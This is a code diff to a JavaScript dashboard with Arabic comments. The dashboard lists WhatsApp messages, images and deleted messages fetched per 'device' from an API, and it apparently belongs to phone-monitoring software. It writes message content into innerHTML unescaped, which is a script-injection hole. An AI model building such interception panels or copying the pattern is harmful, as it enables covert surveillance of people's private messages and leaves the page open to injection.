@@ -211,7 +211,6 @@ async function loadDeleted() {
     } catch (e) {}
 }
 
-// ✅ تحميل رسائل واتساب — محادثات مجمعة
 async function loadWhatsApp() {
     try {
         const response = await fetch(`/api.php?action=get_whatsapp&device=${encodeURIComponent(currentDevice)}`);
@@ -227,7 +226,6 @@ async function loadWhatsApp() {
             return;
         }
         
-        // ✅ تجميع الرسائل حسب المرسل
         const conversations = {};
         messages.forEach(msg => {
             const sender = msg.sender || 'غير معروف';
@@ -237,7 +235,6 @@ async function loadWhatsApp() {
             conversations[sender].push(msg);
         });
         
-        // ✅ عرض كل محادثة في مربع مستقل
         Object.keys(conversations).forEach(sender => {
             const msgs = conversations[sender].sort((a, b) => new Date(a.timestamp) - new Date(b.timestamp));
             const lastMsg = msgs[msgs.length - 1];
@@ -266,18 +263,15 @@ async function loadWhatsApp() {
     } catch (e) {}
 }
 
-// ✅ دالة فتح/إغلاق المحادثة
+// ✅ دالة فتح/إغلاق المحادثة — مع عرض الصور والوسائط
 function toggleWhatsAppChat(sender, conversationDiv) {
-    // ✅ البحث عن صندوق الرسائل الموجود
     const existingBox = conversationDiv.nextElementSibling;
     
     if (existingBox && existingBox.classList.contains('whatsapp-chat-box')) {
-        // ✅ إذا موجود — أغلقه
         existingBox.remove();
         return;
     }
     
-    // ✅ إنشاء صندوق الرسائل
     const chatBox = document.createElement('div');
     chatBox.className = 'whatsapp-chat-box';
     chatBox.style.cssText = `
@@ -286,30 +280,44 @@ function toggleWhatsAppChat(sender, conversationDiv) {
         border-radius: 10px;
         padding: 15px;
         margin-bottom: 10px;
-        max-height: 400px;
+        max-height: 500px;
         overflow-y: auto;
     `;
     
-    // ✅ إحضار كل رسائل هذا المرسل
     fetch(`/api.php?action=get_whatsapp&device=${encodeURIComponent(currentDevice)}`)
         .then(res => res.json())
         .then(messages => {
             const senderMessages = messages.filter(m => (m.sender || 'غير معروف') === sender)
                 .sort((a, b) => new Date(a.timestamp) - new Date(b.timestamp));
             
+            if (senderMessages.length === 0) {
+                chatBox.innerHTML = '<p style="color:#888;">لا توجد رسائل</p>';
+            }
+            
             senderMessages.forEach(msg => {
                 const msgDiv = document.createElement('div');
                 msgDiv.className = 'message incoming';
-                msgDiv.innerHTML = `
-                    <div class="message-bubble">
-                        <div class="message-text">${msg.message || ''}</div>
-                        <div class="message-time">📅 ${formatDate(msg.timestamp)}</div>
-                    </div>
-                `;
+                
+                let html = `<div class="message-bubble">`;
+                
+                if (msg.image_data) {
+                    html += `<img src="data:image/jpeg;base64,${msg.image_data}" class="wa-image" onclick="window.open(this.src)" style="max-width:200px;border-radius:10px;cursor:pointer;margin-bottom:10px;display:block;">`;
+                }
+                
+                const typeIcon = msg.message_type === 'image' ? '📷 صورة' : 
+                                 msg.message_type === 'video' ? '🎬 فيديو' : 
+                                 msg.message_type === 'audio' ? '🎵 رسالة صوتية' : 
+                                 msg.message_type === 'document' ? '📄 مستند' : 
+                                 msg.message_type === 'location' ? '📍 موقع' : '💬';
+                
+                html += `<div class="message-text">${typeIcon} ${msg.message || ''}</div>`;
+                html += `<div class="message-time">📅 ${formatDate(msg.timestamp)}</div>`;
+                html += `</div>`;
+                
+                msgDiv.innerHTML = html;
                 chatBox.appendChild(msgDiv);
             });
             
-            // ✅ إدراج الصندوق بعد المحادثة
             conversationDiv.after(chatBox);
         })
         .catch(e => {
